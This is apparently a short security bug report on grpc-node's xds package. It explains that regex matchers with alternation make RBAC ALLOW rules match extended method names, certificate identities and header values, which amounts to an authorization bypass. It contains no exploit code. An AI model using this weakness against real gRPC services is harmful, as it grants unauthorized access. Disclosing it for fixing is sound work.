https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232

`src/route.ts` (`getPredicateForStringMatcher` / `getPredicateForHeaderMatcher`) builds these for every `safe_regex` `StringMatcher`/`HeaderMatcher`, and src/rbac.ts uses them for RBAC `url_path` `permissions`/`principals`, `authenticated.principal_name` (mTLS SAN/CN), `requested_server_name` and `header rules`. So an ALLOW rule written with an alternation grants access to method names, certificate identities or header values that extend an intended one. DENY policies only become broader (fail-safe).

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L47
